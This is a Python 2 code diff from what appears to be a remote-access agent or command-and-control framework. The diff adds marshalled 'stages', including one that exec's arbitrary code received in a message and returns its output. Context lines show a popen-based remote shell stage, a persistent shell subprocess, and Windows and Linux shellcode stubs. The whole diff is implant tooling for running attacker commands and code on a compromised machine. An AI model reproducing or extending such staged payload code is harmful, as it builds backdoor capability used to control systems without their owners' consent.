@@ -30,6 +30,26 @@ def __work_shell( storage, message ) :
     result = popen( message ).read()
     return result
 
+def __work_echo( storage, message ) :
+	print "Staged function Loaded and run!"
+	return message
+
+def __work_python( storage, message ) :
+	import sys
+	import StringIO
+	# ret = None
+	try :
+		compiled_message = compile(message, '<string>', 'exec')
+		# print compiled_message
+		retIO = StringIO.StringIO()
+		sys.stdout = retIO
+		exec (compiled_message, globals(), locals())
+		sys.stdout = sys.__stdout__
+		ret = retIO.getvalue()
+	except Exception as e:
+		ret = str(e)
+	# print e
+	return ret
 
 
 def __init_shell_process( storage ) :
@@ -43,7 +63,6 @@ def __init_shell_process( storage ) :
 	storage['os_specs'] = os_specs
 	# print shell
 	storage['process'] = Popen( [os_specs[os.name]['shell']], stdout=PIPE, stderr=PIPE, stdin=PIPE, shell = True, bufsize = -1 )
-
 	return True
 
 def __work_shell_process( storage, message ) :
@@ -58,13 +77,13 @@ def __work_shell_process( storage, message ) :
 		comm_sep = storage['os_specs'][os.name]['comm_sep'],
 		linesep=os.linesep,
 		token= mark)
-	print command, command.encode('hex')
+	# print command, command.encode('hex')
 	p.stdin.write(command)
 	p.stdin.flush()
 	stdout_ret = ''
 	while True :
 		stdout_data = p.stdout.readline()
-		print "STDOUT: '%s'"% stdout_data
+		# print "STDOUT: '%s'"% stdout_data
 		if mark in stdout_data or not stdout_data:
 			# print stdout_data.startswith(mark)
 			break
@@ -100,16 +119,8 @@ def __system_info( message ) :
 
 
 
-def __echo( message ) :
-	return message
 
 
-
-__win_shellcode_pycode = '''
-
-
-
-'''
 
 
 def __win_shellcode( payload ) :
@@ -165,9 +176,22 @@ def __lin_shellcode( payload ) :
 def __system_info_handler( message ) :
     pass
 
-
-
 CommonStages = {}
+CommonStages['echo'] = {}
+CommonStages['echo']['payload'] = {}
+
+CommonStages['echo']['payload']['init'] = None
+CommonStages['echo']['payload']['work'] = __work_echo.func_code
+CommonStages['echo']['marshal'] = marshal.dumps( CommonStages['echo']['payload'] )
+
+CommonStages['python'] = {}
+CommonStages['python']['payload'] = {}
+
+CommonStages['python']['payload']['init'] = None
+CommonStages['python']['payload']['work'] = __work_python.func_code
+CommonStages['python']['marshal'] = marshal.dumps( CommonStages['python']['payload'] )
+
+
 CommonStages['shell'] = {}
 CommonStages['shell']['payload'] = {}
 
@@ -196,7 +220,7 @@ WindowsStages = {}
 WindowsStages['shellcode'] = {}
 WindowsStages['shellcode']['function'] = __win_shellcode
 # WindowsStages['shellcode']['marshal'] = marshal.dumps( __win_shellcode )
-WindowsStages['shellcode']['pycode'] = __win_shellcode_pycode
+# WindowsStages['shellcode']['pycode'] = __win_shellcode_pycode
 
 LinuxStages = {}
 LinuxStages['shellcode'] = {}
